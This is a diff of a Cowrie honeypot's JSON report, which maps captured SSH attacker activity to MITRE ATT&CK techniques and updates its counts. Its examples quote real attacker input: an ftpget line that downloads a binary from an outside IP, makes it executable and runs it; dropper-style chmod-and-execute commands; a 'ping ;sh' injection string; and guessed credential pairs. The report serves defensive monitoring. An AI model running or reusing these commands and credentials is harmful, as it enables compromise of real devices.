@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-14 01:04:42",
+  "generated": "2026-08-14 02:02:42",
   "totals": {
-    "commands": 40,
-    "login_failed": 53,
-    "login_success": 5,
-    "sessions": 85
+    "commands": 63,
+    "login_failed": 77,
+    "login_success": 7,
+    "sessions": 136
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 53,
+      "count": 77,
       "examples": [
         "dispatch-sjjr / dispatch-sjjr",
         "root / 123321",
@@ -21,14 +21,14 @@
         "root / 12345"
       ],
       "first": "2026-08-14T00:01:53.440937Z",
-      "last": "2026-08-14T01:03:59.929887Z",
-      "unique_ips": 13
+      "last": "2026-08-14T02:02:20.482552Z",
+      "unique_ips": 15
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 16,
+      "count": 28,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,14 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T01:00:00.601009Z",
-      "unique_ips": 2
+      "last": "2026-08-14T01:41:00.367153Z",
+      "unique_ips": 3
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 5,
+      "count": 7,
       "examples": [
         "ubuntu / 123456",
         "enable\\x00 / linuxshell\\x00",
@@ -53,8 +53,8 @@
         "root / root"
       ],
       "first": "2026-08-14T00:11:55.270801Z",
-      "last": "2026-08-14T00:59:21.228545Z",
-      "unique_ips": 5
+      "last": "2026-08-14T01:48:20.872812Z",
+      "unique_ips": 7
     },
     {
       "id": "T1105",
@@ -99,46 +99,46 @@
   "unmapped": [
     [
       "/bin/busybox",
-      9
+      11
     ],
     [
       "system",
-      2
+      3
     ],
     [
       "shell",
-      2
+      3
     ],
     [
       "sh",
+      3
+    ],
+    [
+      "enable",
+      2
+    ],
+    [
+      "linuxshell",
+      2
+    ],
+    [
+      "enablelinuxshell",
+      2
+    ],
+    [
+      "ping ;sh",
+      2
+    ],
+    [
+      "busybox",
+      2
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       2
     ],
     [
       "/bin/busybox UNSTABLE",
-      1
-    ],
-    [
-      "enable",
-      1
-    ],
-    [
-      "linuxshell",
-      1
-    ],
-    [
-      "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
-      1
-    ],
-    [
-      "busybox",
-      1
-    ],
-    [
-      "cd /proc && cat self/cmdline",
       1
     ]
   ]
